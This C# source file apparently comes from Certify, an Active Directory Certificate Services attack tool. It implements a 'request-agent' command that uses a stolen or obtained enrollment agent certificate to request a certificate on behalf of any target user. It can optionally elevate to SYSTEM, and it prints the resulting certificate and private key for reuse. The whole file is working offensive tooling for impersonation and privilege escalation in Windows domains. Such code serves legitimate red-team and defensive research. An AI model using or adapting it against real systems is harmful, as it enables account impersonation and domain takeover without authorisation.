using Certify.Lib;
using CommandLine;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Security.Principal;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;

#if !DISARMED

namespace Certify.Commands
{
    internal class CertRequestOnBehalf
    {
        [Verb("request-agent", HelpText = "Request a certificate using a request agent")]
        public class Options : DefaultOptions
        {
            [Option("ca", Required = true, HelpText = "Target certificate authority (format: SERVER\\CA-NAME)")]
            public string CertificateAuthority { get; set; }

            [Option("template", Required = true, HelpText = "Target certificate template")]
            public string TemplateName { get; set; }

            [Option("target", Required = true, HelpText = "Target user to request a certificate for")]
            public string TargetUser { get; set; }

            [Option("agent-pfx", Required = true, HelpText = "Target enrollment agent certificate")]
            public string EnrollmentCertificate { get; set; }

            [Option("agent-pass", HelpText = "Password for agent certificate")]
            public string EnrollmentCertificatePassword { get; set; }

            [Option("application-policy", HelpText = "Target application policy")]
            public IEnumerable<string> ApplicationPolicies { get; set; }

            [Option("key-size", Default = 2048, HelpText = "Key size for the private key")]
            public int KeySize { get; set; }

            [Option("machine", HelpText = "Request as the machine account")]
            public bool MachineContext { get; set; }

            [Option("output-pem", HelpText = "Output certificate in PEM format")]
            public bool OutputPem { get; set; }

            [Option("install", HelpText = "Install certificate in the current store")]
            public bool Install { get; set; }
        }

        public static int Execute(Options opts)
        {
            Console.WriteLine("[*] Action: Request a certificate (on behalf of another user)");

            if (!string.IsNullOrEmpty(opts.CertificateAuthority) && !opts.CertificateAuthority.Contains("\\"))
            {
                Console.WriteLine("[X] The 'certificate authority' parameter is not of the format 'SERVER\\CA-NAME'.");
                return 1;
            }

            byte[] enrollment_cert_bytes = null;

            if (!string.IsNullOrEmpty(opts.EnrollmentCertificate))
            {
                try
                {
                    enrollment_cert_bytes = Convert.FromBase64String(opts.EnrollmentCertificate);
                }
                catch (Exception e)
                {
                    Console.WriteLine($"[X] Failed to decode CA certificate parameter: {e.Message}");
                    return 1;
                }
            }

            foreach (var x in opts.ApplicationPolicies)
            {
                if (!Regex.IsMatch(x, @"^\d+(\.\d+)*$", RegexOptions.IgnoreCase))
                {
                    Console.WriteLine("[X] A policy parameter is not of the format '<policy oid>'.");
                    return 1;
                }
            }

            if (opts.KeySize != 512 && opts.KeySize != 1024 && opts.KeySize != 2048 && opts.KeySize != 4096)
            {
                Console.WriteLine("[X] The 'key size' parameter must be either 512, 1024, 2048 or 4096.");
                return 1;
            }

            RequestCertOnBehalf(opts, enrollment_cert_bytes);
            return 0;
        }

        private static void RequestCertOnBehalf(Options opts, byte[] enrollment_certificate)
        {
            if (opts.MachineContext && !WindowsIdentity.GetCurrent().IsSystem)
            {
                Console.WriteLine("[*] Elevating to SYSTEM context for machine cert request");
                ElevationUtil.GetSystem(() => RequestCertOnBehalf(opts, enrollment_certificate));
            }
            else
            {
                Console.WriteLine();
                Console.WriteLine($"[*] Current user context    : {WindowsIdentity.GetCurrent().Name}");
                Console.WriteLine();
                Console.WriteLine($"[*] Template                : {opts.TemplateName}");
                Console.WriteLine($"[*] On Behalf Of            : {opts.TargetUser}");

                var csr = CertEnrollment.CreateCertRequestOnBehalfMessage(opts.TemplateName, opts.TargetUser, enrollment_certificate, 
                    opts.EnrollmentCertificatePassword, opts.ApplicationPolicies.ToList(), opts.KeySize, opts.MachineContext);

                Console.WriteLine();
                Console.WriteLine($"[*] Certificate Authority   : {opts.CertificateAuthority}");

                try
                {
                    int request_id = CertEnrollment.SendCertificateRequest(opts.CertificateAuthority, csr.Item1);

                    Console.WriteLine($"[*] Request ID              : {request_id}");
                    Console.WriteLine();

                    Thread.Sleep(3000);

                    var certificate_pem = CertEnrollment.DownloadCert(opts.CertificateAuthority, request_id);

                    if (opts.OutputPem)
                    {
                        Console.WriteLine("[*] Certificate (PEM)       :");
                        Console.WriteLine();
                        Console.Write(csr.Item2);
                        Console.Write(certificate_pem);
                    }
                    else
                    {
                        Console.WriteLine("[*] Certificate (PFX)       :");
                        Console.WriteLine();
                        Console.WriteLine(Convert.ToBase64String(CertTransformUtil.MakePfx(certificate_pem, csr.Item2)));
                    }
                }
                catch (Exception e)
                {
                    Console.WriteLine($"[X] Error requesting the certificate: {e.Message}");
                    Console.WriteLine();
                    Console.WriteLine("[*] Private Key (PEM)       :");
                    Console.WriteLine();

                    if (opts.OutputPem)
                        Console.Write(csr.Item2);
                    else
                        Console.WriteLine(Convert.ToBase64String(Encoding.UTF8.GetBytes(csr.Item2)));
                }
            }
        }
    }
}

#endif